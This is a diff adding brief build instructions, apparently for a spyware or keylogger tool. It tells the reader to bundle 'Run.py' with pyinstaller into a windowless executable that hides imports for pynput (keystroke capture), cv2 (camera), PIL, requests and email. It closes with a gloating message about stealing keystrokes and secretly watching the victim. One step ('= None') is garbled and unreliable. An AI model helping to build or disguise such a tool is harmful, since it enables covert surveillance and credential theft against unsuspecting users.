@@ -1,0 +1,7 @@
+1. First, install pyinstaller so that you don't have problems to combine the file into executable, enter (pip install pyinstaller) in your console and press enter and wait until the installation is finished.
+
+2. pyinstaller --onefile --noconsole --hidden-import=requests --hidden-import=bs4 --hidden-import=email --hidden-import=cv2 --hidden-import=PIL --hidden-import=pynput --hidden-import=colorama Run.py
+
+3. = None
+
+4. "Done ,Your defenses are paper walls against my storm. Every keystroke whispers your secrets; every shadow hides my trace. By the time you notice, I'll already be gone... or maybe I’ll just be watching."
